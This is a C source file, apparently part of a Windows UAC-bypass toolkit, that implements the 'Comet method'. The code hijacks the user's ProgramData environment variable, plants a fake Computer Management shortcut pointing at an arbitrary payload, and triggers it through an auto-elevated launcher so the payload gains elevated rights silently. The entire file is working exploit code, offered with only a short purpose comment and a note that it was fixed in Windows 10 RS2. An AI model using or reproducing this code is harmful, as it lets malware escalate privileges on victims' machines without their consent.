/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       COMET.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  Comet method (c) BreakingMalware
*  For description please visit original URL 
*  https://breakingmalware.com/vulnerabilities/command-injection-and-elevation-environment-variables-revisited
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include <ShlGuid.h>
#include <ShObjIdl.h>

/*
* ucmCometMethod
*
* Purpose:
*
* Fool autoelevated application with help of manipulation of the current user environment variables.
* CompMgmtLauncher.exe is a moronic .LNK ShellExecute launcher application.
* Only MS do system trusted applications which only purpose is to LAUNCH .LNK files.
*
* Fixed in Windows 10 RS2
*
*/
NTSTATUS ucmCometMethod(
    _In_ LPWSTR lpszPayload
)
{
#ifndef _WIN64
    PVOID   OldValue = NULL;
#endif

    HRESULT hr_init;

    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    BOOL    bCond = FALSE;
    WCHAR   szCombinedPath[MAX_PATH * 2], szLinkFile[MAX_PATH * 3];

    IPersistFile    *persistFile = NULL;
    IShellLink      *newLink = NULL;

    SHELLEXECUTEINFO  shinfo;

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

    do {

        RtlSecureZeroMemory(szCombinedPath, sizeof(szCombinedPath));
        _strcpy(szCombinedPath, g_ctx->szTempDirectory);
        _strcat(szCombinedPath, SOMEOTHERNAME);
        if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcpy(szLinkFile, szCombinedPath);
        _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
        if (!CreateDirectory(szLinkFile, NULL)) {//%temp%\<targetdir>\Comet.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        if (!supSetEnvVariable(FALSE, NULL, T_PROGRAMDATA, szCombinedPath))
            break;

        _strcat(szCombinedPath, TEXT("\\Microsoft"));
        if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet\Microsoft
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcat(szCombinedPath, TEXT("\\Windows"));
        if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet\Microsoft\Windows
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcat(szCombinedPath, TEXT("\\Start Menu"));
        if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet\Microsoft\Windows\Start Menu
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcat(szCombinedPath, TEXT("\\Programs"));
        if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet\Microsoft\Windows\Start Menu\Programs
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcat(szCombinedPath, TEXT("\\Administrative Tools"));
        if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet\Microsoft\Windows\Start Menu\Programs\Administrative Tools
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        if (SUCCEEDED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID *)&newLink))) {
            newLink->lpVtbl->SetPath(newLink, lpszPayload);
            newLink->lpVtbl->SetArguments(newLink, L"");
            newLink->lpVtbl->SetDescription(newLink, L"Comet method");
            if (SUCCEEDED(newLink->lpVtbl->QueryInterface(newLink, &IID_IPersistFile, (void **)&persistFile))) {
                _strcpy(szLinkFile, szCombinedPath);
                _strcat(szLinkFile, L"\\Computer Management.lnk");
                if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
                    persistFile->lpVtbl->Release(persistFile);

                    _strcpy(szCombinedPath, g_ctx->szTempDirectory);
                    _strcat(szCombinedPath, SOMEOTHERNAME);
                    _strcpy(szLinkFile, szCombinedPath);
                    _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);

                    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
                    shinfo.cbSize = sizeof(shinfo);
                    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
                    shinfo.lpFile = szLinkFile;
                    shinfo.lpParameters = L"";
                    shinfo.lpVerb = MANAGE_VERB;
                    shinfo.lpDirectory = szCombinedPath;
                    shinfo.nShow = SW_SHOW;
                    if (ShellExecuteEx(&shinfo)) {
                        CloseHandle(shinfo.hProcess);
                        MethodResult = STATUS_SUCCESS;
                    }
                }
            }
            newLink->lpVtbl->Release(newLink);
        }

        if (hr_init == S_OK)
            CoUninitialize();

    } while (bCond);

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
    }
#endif

    supSetEnvVariable(TRUE, NULL, T_PROGRAMDATA, NULL);
    return MethodResult;
}
